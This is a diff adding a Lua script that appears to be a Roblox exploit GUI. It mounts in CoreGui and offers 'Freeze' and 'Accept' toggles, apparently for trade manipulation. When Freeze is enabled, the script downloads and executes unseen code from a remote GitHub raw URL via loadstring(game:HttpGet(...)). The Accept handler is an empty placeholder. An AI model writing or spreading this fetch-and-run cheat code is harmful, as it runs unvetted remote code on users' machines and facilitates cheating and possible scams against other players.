@@ -1,0 +1,59 @@
+local ScreenGui = Instance.new("ScreenGui")
+local MainFrame = Instance.new("Frame")
+local FreezeToggle = Instance.new("TextButton")
+local AcceptToggle = Instance.new("TextButton")
+
+-- Parent GUI to PlayerGui
+ScreenGui.Parent = game.CoreGui
+
+-- Main Frame Properties
+MainFrame.Parent = ScreenGui
+MainFrame.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+MainFrame.Size = UDim2.new(0, 200, 0, 100)
+MainFrame.Position = UDim2.new(0.4, 0, 0.4, 0)
+MainFrame.Active = true
+MainFrame.Draggable = true
+
+-- Freeze Button
+FreezeToggle.Parent = MainFrame
+FreezeToggle.Text = "Freeze (OFF)"
+FreezeToggle.Size = UDim2.new(0, 180, 0, 40)
+FreezeToggle.Position = UDim2.new(0, 10, 0, 10)
+FreezeToggle.BackgroundColor3 = Color3.fromRGB(100, 0, 0)
+FreezeToggle.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+local freezeEnabled = false
+
+FreezeToggle.MouseButton1Click:Connect(function()
+    freezeEnabled = not freezeEnabled
+    if freezeEnabled then
+        FreezeToggle.Text = "Freeze (ON)"
+        FreezeToggle.BackgroundColor3 = Color3.fromRGB(0, 100, 0)
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/realarceusx/realarceusx/refs/heads/main/kil"))()
+    else
+        FreezeToggle.Text = "Freeze (OFF)"
+        FreezeToggle.BackgroundColor3 = Color3.fromRGB(100, 0, 0)
+    end
+end)
+
+-- Accept Button (Placeholder for your own function)
+AcceptToggle.Parent = MainFrame
+AcceptToggle.Text = "Accept (OFF)"
+AcceptToggle.Size = UDim2.new(0, 180, 0, 40)
+AcceptToggle.Position = UDim2.new(0, 10, 0, 55)
+AcceptToggle.BackgroundColor3 = Color3.fromRGB(100, 0, 0)
+AcceptToggle.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+local acceptEnabled = false
+
+AcceptToggle.MouseButton1Click:Connect(function()
+    acceptEnabled = not acceptEnabled
+    if acceptEnabled then
+        AcceptToggle.Text = "Accept (ON)"
+        AcceptToggle.BackgroundColor3 = Color3.fromRGB(0, 100, 0)
+        -- Add your "Accept" function here
+    else
+        AcceptToggle.Text = "Accept (OFF)"
+        AcceptToggle.BackgroundColor3 = Color3.fromRGB(100, 0, 0)
+    end
+end)
